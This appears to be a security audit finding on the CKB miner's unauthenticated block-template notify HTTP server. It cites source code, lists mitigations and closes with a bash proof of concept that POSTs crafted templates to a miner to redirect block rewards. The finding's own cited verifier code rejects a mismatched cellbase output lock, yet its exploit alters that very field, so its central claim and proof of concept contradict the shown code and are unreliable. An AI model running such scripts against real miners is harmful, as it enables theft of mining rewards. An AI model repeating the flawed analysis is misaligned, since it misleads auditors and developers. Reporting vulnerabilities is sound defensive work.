### Title
Unauthenticated Miner Block Template Notify HTTP Server Allows Mining Reward Redirection — (File: miner/src/client.rs)

---

### Summary

The CKB miner's optional block-template notify HTTP server (`listen_block_template_notify`) accepts any inbound HTTP POST and immediately replaces the active mining work with the attacker-supplied `BlockTemplate`, including its coinbase lock script. No authentication, IP allowlist, or shared-secret check exists anywhere in the handler. Because the node's `RewardVerifier` validates the coinbase lock of the *current* block only against a *previous* block's lock (finalization-delay accounting), a block assembled from an attacker-supplied template passes all consensus checks. The miner's hashpower is silently redirected to produce blocks whose future reward is paid to the attacker's address.

---

### Finding Description

**Root cause — missing authentication in the notify handler**

`listen_block_template_notify` binds a raw TCP listener to the operator-configured `SocketAddr` and serves every accepted connection through the `handle` function:

```rust
// miner/src/client.rs  lines 358-369
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();
    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);   // ← no auth, no source check
    }
    Ok(Response::new(Empty::new()))
}
``` [1](#0-0) 

The listener itself discards the peer address and applies no IP filter:

```rust
// miner/src/client.rs  lines 244-246
conn = listener.accept() => {
    let (stream, _) = match conn {   // ← peer address dropped
``` [2](#0-1) 

`update_block_template` accepts any template whose `work_id` differs from the current one, or when the current id is `0` (the initial state):

```rust
// miner/src/client.rs  lines 295-311
let updated = |id| {
    if id != work_id || id == 0 {   // ← always true on first push
        Some(work_id)
    } else {
        None
    }
};
``` [3](#0-2) 

**Why the node accepts the resulting block**

`submit_block` in `rpc/src/module/miner.rs` treats `work_id` as a logging string only — it is never validated against any stored state. The block is accepted if it passes `HeaderVerifier` and `blocking_process_block`. [4](#0-3) 

`RewardVerifier` validates the coinbase output's lock script against `target_lock`, which is derived from a *previous* block's coinbase (CKB's finalization-delay reward model), not from the current block assembler configuration:

```rust
// verification/contextual/src/contextual_block_verifier.rs  lines 242-271
let (target_lock, block_reward) = self.context.finalize_block_reward(self.parent)?;
...
if cellbase.transaction.outputs().get(0)...lock() != target_lock {
    return Err((CellbaseError::InvalidRewardTarget).into());
}
``` [5](#0-4) 

The coinbase lock script of the *current* block being mined is therefore never checked against the block assembler config at submission time. A block whose coinbase carries the attacker's lock script passes all consensus verification and is inserted into the chain.

**Attack flow**

1. Attacker identifies a miner with `listen` bound to a reachable address (e.g., `0.0.0.0:8888`).
2. Attacker fetches the current block template from the public `get_block_template` RPC to obtain valid `parent_hash`, `epoch`, `number`, `compact_target`, and transaction set.
3. Attacker replaces the `cellbase` transaction's output lock script with their own address and sets `work_id = 0` (or any value ≠ current).
4. Attacker HTTP-POSTs the crafted `BlockTemplate` JSON to `http://<miner>:8888/`.
5. `handle` deserializes it and calls `update_block_template`; the miner's workers immediately switch to the attacker's template.
6. When the miner solves the PoW, it calls `submit_block` with the attacker's coinbase; the node accepts the block.
7. After `finalization_delay` blocks, the reward for this block is paid to the attacker's lock script.

The miner's own node continues to push legitimate templates via the `notify` URL, but the attacker can re-inject their template faster or continuously, winning the race.

---

### Impact Explanation

- **Mining reward theft**: Every block solved while the attacker's template is active pays the block reward (currently ~1917 CKB + fees) to the attacker's address rather than the miner's.
- **Sustained attack**: The attacker can re-POST on every new block, continuously redirecting rewards for as long as the miner's notify port is reachable.
- **No on-chain trace**: The submitted block is consensus-valid; the miner's node logs only a `work_id` string and cannot distinguish a legitimate template push from an attacker's.

---

### Likelihood Explanation

The `listen` option is opt-in and commented out by default in `resource/ckb-miner.toml`. [6](#0-5) 

However, mining pools and professional miners commonly use notify mode to reduce latency. When the listen address is set to anything other than `127.0.0.1` (e.g., `0.0.0.0:8888` in a multi-machine mining setup), the endpoint is reachable by any network peer. No privilege, key, or insider access is required — only TCP connectivity to the miner's port.

---

### Recommendation

Add authentication to the notify HTTP server. Concrete options:

1. **Shared-secret token**: Require a configurable bearer token in the `Authorization` header; reject requests that omit or mismatch it.
2. **IP allowlist**: Add a `notify_allowed_ips` config field; drop connections from addresses not on the list.
3. **Bind-only to loopback by default with a hard warning**: Refuse to start in notify mode if `listen` resolves to a non-loopback address unless an explicit `allow_remote_notify = true` flag is set, and emit a prominent warning.

---

### Proof of Concept

```bash
# 1. Fetch a valid template from the node's public RPC
TEMPLATE=$(curl -s -X POST http://<node>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"get_block_template","params":[null,null,null]}' \
  | jq '.result')

# 2. Replace the cellbase output lock args with attacker's blake160 pubkey hash
ATTACKER_TEMPLATE=$(echo "$TEMPLATE" | jq '
  .cellbase.data.outputs[0].lock.args = "0x<attacker_lock_arg_20_bytes>"
  | .work_id = "0x0"
')

# 3. Push to the miner's unauthenticated notify endpoint
curl -s -X POST http://<miner>:8888/ \
  -H 'Content-Type: application/json' \
  -d "$ATTACKER_TEMPLATE"

# 4. Repeat every ~10 seconds to outrace the legitimate node notify
```

The miner's workers switch to the attacker's template. The next solved block is submitted with the attacker's coinbase lock script and accepted by the node. After `finalization_delay` blocks the reward is paid to the attacker.

### Citations

**File:** miner/src/client.rs (L234-255)
```rust
    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
        let server = auto::Builder::new(TokioExecutor::new());
        let graceful = GracefulShutdown::new();
        let stop_rx: CancellationToken = new_tokio_exit_rx();

        loop {
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
            tokio::select! {
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
                        Err(e) => {
                            info!("accept error: {}", e);
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }
                    };
                    let stream = hyper_util::rt::TokioIo::new(Box::pin(stream));
                    let conn = server.serve_connection_with_upgrades(stream, handle);

```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** rpc/src/module/miner.rs (L260-298)
```rust
    fn submit_block(&self, work_id: String, block: Block) -> Result<H256> {
        let block: packed::Block = block.into();
        let block: Arc<core::BlockView> = Arc::new(block.into_view());
        let header = block.header();
        debug!(
            "start to submit block, work_id = {}, block = #{}({})",
            work_id,
            block.number(),
            block.hash()
        );

        let snapshot: &Snapshot = &self.shared.snapshot();
        let consensus = snapshot.consensus();

        // Verify header
        HeaderVerifier::new(snapshot, consensus)
            .verify(&header)
            .map_err(|err| handle_submit_error(&work_id, &err))?;
        if self
            .shared
            .snapshot()
            .get_block_header(&block.parent_hash())
            .is_none()
        {
            let err = format!(
                "Block parent {} of {}-{} not found",
                block.parent_hash(),
                block.number(),
                block.hash()
            );

            return Err(handle_submit_error(&work_id, &err));
        }

        // Verify and insert block
        let is_new = self
            .chain
            .blocking_process_block(Arc::clone(&block))
            .map_err(|err| handle_submit_error(&work_id, &err))?;
```

**File:** verification/contextual/src/contextual_block_verifier.rs (L242-271)
```rust
        let (target_lock, block_reward) = self.context.finalize_block_reward(self.parent)?;
        let output = CellOutput::new_builder()
            .capacity(block_reward.total)
            .lock(target_lock.clone())
            .build();
        let insufficient_reward_to_create_cell = output.is_lack_of_capacity(Capacity::zero())?;

        if no_finalization_target || insufficient_reward_to_create_cell {
            let ret = if cellbase.transaction.outputs().is_empty() {
                Ok(())
            } else {
                Err((CellbaseError::InvalidRewardTarget).into())
            };
            return ret;
        }

        if !insufficient_reward_to_create_cell {
            if cellbase.transaction.outputs_capacity()? != block_reward.total {
                return Err((CellbaseError::InvalidRewardAmount).into());
            }
            if cellbase
                .transaction
                .outputs()
                .get(0)
                .expect("cellbase should have output")
                .lock()
                != target_lock
            {
                return Err((CellbaseError::InvalidRewardTarget).into());
            }
```

**File:** resource/ckb-miner.toml (L59-60)
```text
# enable listen notify mode
# listen = "127.0.0.1:8888"
```
